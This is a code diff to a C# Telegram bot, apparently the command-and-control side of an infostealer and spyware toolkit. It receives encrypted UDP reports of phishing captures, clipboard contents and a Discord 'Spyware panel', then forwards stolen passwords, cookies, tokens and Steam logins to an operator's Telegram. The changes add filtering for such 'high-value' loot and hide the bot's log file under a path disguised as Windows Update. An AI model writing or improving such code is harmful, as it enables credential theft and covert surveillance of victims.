@@ -26,12 +26,12 @@ namespace FinalBot
 
         [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
         [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
-        public BotOrchestrator(string token, string adminId)
+        public BotOrchestrator(string token, string adminId, HttpClient? client = null)
         {
-            _botClient = new TelegramBotClient(token);
+            _botClient = new TelegramBotClient(token, client);
             _adminId = adminId;
             _commandHandler = new CommandHandler(_botClient, _adminId);
-            TelegramService.Initialize(token, adminId);
+            TelegramService.Initialize(token, adminId, client);
 
             // NativeAOT Hint: preserve generic list of UpdateType
             GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
@@ -41,6 +41,7 @@ namespace FinalBot
         {
             try 
             {
+                Console.WriteLine("[ORCHESTRATOR] Starting services...");
                 DebugLog("[ORCHESTRATOR] Starting services...");
                 
                 // Start UDP listener for phishing reports (Steam/WeChat)
@@ -69,7 +70,7 @@ namespace FinalBot
             {
                 Console.WriteLine($"[STARTUP ERROR] {ex.Message}\n{ex.StackTrace}");
                 // Log to file since console might be hidden
-                try { System.IO.File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] [BOT ERROR] {ex}\n"); } catch { }
+                try { System.IO.File.AppendAllText(System.IO.Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] [BOT ERROR] {ex}\n"); } catch { }
             }
 
             // Keep alive
@@ -153,7 +154,9 @@ namespace FinalBot
                     {
                         var result = await udpClient.ReceiveAsync();
                         string raw = Encoding.UTF8.GetString(result.Buffer);
-                        Console.WriteLine($"[UDP] Received: {raw.Substring(0, Math.Min(80, raw.Length))}...");
+                        string shortRaw = raw.Length > 80 ? raw.Substring(0, 80) + "..." : raw;
+                        // Console.WriteLine($"[UDP] Received: {shortRaw}");
+                        // DebugLog($"[UDP DATA] {raw}"); // REMOVED: Prevent feedback loop with GlobalLogger
 
                         // Decrypt phishing payload
                         string decrypted = DecryptString(raw);
@@ -175,10 +178,9 @@ namespace FinalBot
                             }
                         }
 
-                        // Progress Bar Logic (Discord Bot)
-                        if (decrypted.Contains("Discord Progress:"))
+                        // Block-style Discord Updates
+                        if (decrypted.Contains("[Discord]"))
                         {
-                            // Message format: "Discord Progress: [BAR] XX% | Status"
                             int lastMsgId = CommandHandler.GetLastDiscordMessageId();
                             if (lastMsgId != 0)
                             {
@@ -187,16 +189,22 @@ namespace FinalBot
                                     await _botClient.EditMessageTextAsync(
                                         chatId: _adminId,
                                         messageId: lastMsgId,
-                                        text: "🎮 <b>Discord Remote Bot</b>\n━━━━━━━━━━━━━━━━━━\n" + decrypted + "\n━━━━━━━━━━━━━━━━━━",
-                                        parseMode: Telegram.Bot.Types.Enums.ParseMode.Html
+                                        text: decrypted,
+                                        parseMode: ParseMode.Html
                                     );
                                 } catch { }
                             }
-
-                            if (decrypted.Contains("100%") && decrypted.Contains("OK"))
+                            else 
                             {
-                                await _botClient.SendTextMessageAsync(_adminId, "✅ <b>Discord Bot Ready!</b>\nUse the Spyware panel to control it.", parseMode: Telegram.Bot.Types.Enums.ParseMode.Html);
+                                var sent = await _botClient.SendTextMessageAsync(_adminId, decrypted, parseMode: ParseMode.Html);
+                                CommandHandler.SetLastDiscordMessageId(sent.MessageId);
                             }
+
+                            if (decrypted.Contains("100%"))
+                            {
+                                CommandHandler.SetDiscordReady(true);
+                            }
+                            continue;
                         }
                         else if (decrypted.Contains("Discord Remote Bot:") && decrypted.Contains("%"))
                         {
@@ -215,6 +223,13 @@ namespace FinalBot
                                 catch { _lastLogMessageId = 0; } // Fallback to new message
                             }
                         }
+
+                        if (decrypted.Contains("DISCONNECT"))
+                        {
+                            CommandHandler.SetDiscordReady(false);
+                        }
+
+                        // ... previous logic for other types ...
                         else if (decrypted.StartsWith("CLIPBOARD:"))
                         {
                             string clipboardContent = decrypted.Substring(10).Trim();
@@ -226,14 +241,26 @@ namespace FinalBot
                             continue;
                         }
 
-                        // Default: Send new message and store ID
-                        var msg = await _botClient.SendTextMessageAsync(
-                            chatId: _adminId,
-                            text: $"🎯 <b>SYSTEM LOG</b>\n━━━━━━━━━━━━━━━━━━\n{decrypted}\n━━━━━━━━━━━━━━━━━━",
-                            parseMode: ParseMode.Html
-                        );
-                        
-                        _lastLogMessageId = msg.MessageId;
+                        // 1. ONLY send recognized high-level events to Telegram
+                        // Covers: phishing captures, credential grabs, stealer outputs
+                        bool isHighValue =
+                            decrypted.Contains("捕获") || decrypted.Contains("Captured") ||
+                            decrypted.Contains("Login") || decrypted.Contains("Password") ||
+                            decrypted.Contains("Cookie") || decrypted.Contains("Steam") ||
+                            decrypted.Contains("Alert") || decrypted.Contains("Critical") ||
+                            decrypted.Contains("Token") || decrypted.Contains("Credentials") ||
+                            decrypted.Contains("Opened") || decrypted.Contains("Closed") ||
+                            decrypted.Contains("Entered") || decrypted.Contains("Введен") ||
+                            decrypted.StartsWith("💎") || decrypted.StartsWith("🚨") ||
+                            decrypted.StartsWith("✅") || decrypted.StartsWith("📦");
+
+                        if (isHighValue)
+                        {
+                            try { await _botClient.SendTextMessageAsync(_adminId, decrypted, parseMode: ParseMode.Html); } catch { }
+                        }
+
+                        // 2. Always output to local debug console/file for full telemetry
+                        DebugLog($"[CORE LOG] {decrypted}");
                     }
                     catch (Exception ex)
                     {
@@ -273,7 +300,7 @@ namespace FinalBot
 
         private void DebugLog(string msg)
         {
-            try { System.IO.File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
+            try { System.IO.File.AppendAllText(System.IO.Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] {msg}\n"); } catch { }
         }
 
         public void Stop()
